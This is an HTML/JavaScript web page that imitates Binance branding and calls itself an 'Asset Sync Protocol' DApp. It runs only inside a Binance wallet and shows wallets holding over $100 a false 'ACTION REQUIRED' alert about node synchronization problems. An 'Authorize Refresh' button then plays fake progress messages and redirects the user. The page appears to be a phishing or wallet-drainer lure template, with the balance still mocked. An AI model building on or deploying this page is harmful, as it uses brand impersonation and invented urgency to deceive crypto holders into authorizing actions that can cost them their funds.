<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASP - Asset Sync Protocol</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --binance-black: #0b0e11;
            --binance-gray: #1e2329;
            --binance-yellow: #fcd535;
            --error-red: #f6465d;
            --success-green: #0ecb81;
        }
        body { 
            background-color: var(--binance-black); 
            font-family: 'Inter', sans-serif; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
            color: white; 
        }
        .card-bg { 
            background-color: var(--binance-gray); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
        }
        .hidden-content { display: none; }
        .loader-spin {
            border: 3px solid rgba(252, 213, 53, 0.1);
            border-top: 3px solid var(--binance-yellow);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="p-4" onload="checkBinanceWallet()">

    <div id="main-wrapper" class="max-w-md w-full card-bg rounded-[32px] p-6 shadow-2xl relative overflow-hidden text-center">
        
        <div class="flex flex-col items-center mb-6">
            <div class="w-16 h-16 bg-gradient-to-tr from-[#fcd535] to-[#f0b90b] rounded-2xl flex items-center justify-center shadow-lg mb-3">
                <span class="text-black font-black text-2xl">ASP</span>
            </div>
            <h1 class="text-xl font-bold">ASP - Asset Sync Protocol</h1>
        </div>

        <div id="wallet-error" class="p-6 bg-red-500/10 border border-red-500/20 rounded-2xl hidden">
            <p class="text-[#f6465d] font-bold text-sm mb-2">Access Denied!</p>
            <p class="text-gray-400 text-xs">
                This DApp can only be accessed from within the <b>Binance App</b> or <b>Binance Wallet</b>. 
                Please use the official Binance application to continue.
            </p>
        </div>

        <div id="dapp-content" class="hidden-content text-left">
            <div id="status-badge" class="mb-6 text-center"></div>
            
            <div id="info-box" class="mb-6 p-4 rounded-2xl text-sm font-medium border"></div>

            <div class="mb-6 px-2">
                <p class="text-gray-500 text-[10px] uppercase tracking-[0.2em] mb-1 font-bold">Estimated Portfolio Value</p>
                <div class="flex items-baseline justify-between">
                    <h2 id="total-balance-text" class="text-3xl font-bold text-white">$0.00</h2>
                    <span class="text-[#0ecb81] text-xs font-bold bg-[#0ecb81]/10 px-2 py-1 rounded-lg">LIVE</span>
                </div>
            </div>

            <div id="btn-container" class="mt-8 px-2 hidden">
                <button id="authBtn" onclick="runAssetSync()" class="w-full bg-[#fcd535] hover:bg-[#f0b90b] text-black font-extrabold py-4 rounded-2xl transition-all shadow-xl shadow-yellow-500/10 active:scale-95">
                    Authorize Refresh
                </button>
            </div>
        </div>

        <div id="center-loader" class="absolute inset-0 flex flex-col items-center justify-center z-50 hidden pointer-events-none">
            <div class="loader-spin mb-4"></div>
            <p id="status-text" class="text-[#fcd535] font-bold text-sm tracking-widest text-center px-4"></p>
        </div>

    </div>

    <script>
        function checkBinanceWallet() {
            // Detection logic for Binance
            const isBinance = navigator.userAgent.includes("Binance") || window.ethereum?.isBinance || window.binance;

            const dappContent = document.getElementById('dapp-content');
            const walletError = document.getElementById('wallet-error');

            if (isBinance) {
                dappContent.classList.remove('hidden-content');
                loadAssetData();
            } else {
                walletError.classList.remove('hidden');
            }
        }

        async function loadAssetData() {
            // Mock value for testing (Change this to test the 100$ logic)
            const mockValue = 450.80; 
            document.getElementById('total-balance-text').innerText = "$" + mockValue.toLocaleString();
            
            const infoBox = document.getElementById('info-box');
            const btnContainer = document.getElementById('btn-container');
            const statusBadge = document.getElementById('status-badge');
            
            if (mockValue > 100) {
                // Above $100 Logic
                statusBadge.innerHTML = `<span class="bg-red-500/10 text-[#f6465d] text-[10px] font-bold px-4 py-1.5 rounded-full border border-red-500/20 uppercase tracking-widest">● ACTION REQUIRED</span>`;
                infoBox.className = "mb-6 p-4 rounded-2xl text-sm font-medium bg-red-500/10 text-[#f6465d] border border-red-500/20";
                infoBox.innerText = "Please refresh your currency; data synchronization issues detected in your nodes.";
                btnContainer.classList.remove('hidden');
            } else {
                // Below $100 Logic
                statusBadge.innerHTML = `<span class="bg-green-500/10 text-[#0ecb81] text-[10px] font-bold px-4 py-1.5 rounded-full border border-green-500/20 uppercase tracking-widest">● SYSTEM SECURE</span>`;
                infoBox.className = "mb-6 p-4 rounded-2xl text-sm font-medium bg-green-500/10 text-[#0ecb81] border border-green-500/20";
                infoBox.innerText = "Your currency and portfolio are currently synchronized and secure.";
                btnContainer.classList.add('hidden');
            }
        }

        function runAssetSync() {
            const wrapper = document.getElementById('dapp-content');
            const btn = document.getElementById('authBtn');
            const loader = document.getElementById('center-loader');
            const statusTxt = document.getElementById('status-text');

            wrapper.style.opacity = '0.2';
            wrapper.style.filter = 'blur(6px)';
            btn.disabled = true;
            btn.innerText = "Refreshing Assets...";
            loader.classList.remove('hidden');

            const msgs = ["Connecting to Binance Node...", "Verifying Protocol...", "Finalizing Sync..."];
            let step = 0;

            const syncInterval = setInterval(() => {
                if (step < msgs.length) {
                    statusTxt.innerText = msgs[step];
                    step++;
                }
            }, 2000);

            setTimeout(() => {
                clearInterval(syncInterval);
                window.location.href = "https://accounts.binance.com/"; 
            }, 6000);
        }
    </script>
</body>
</html>
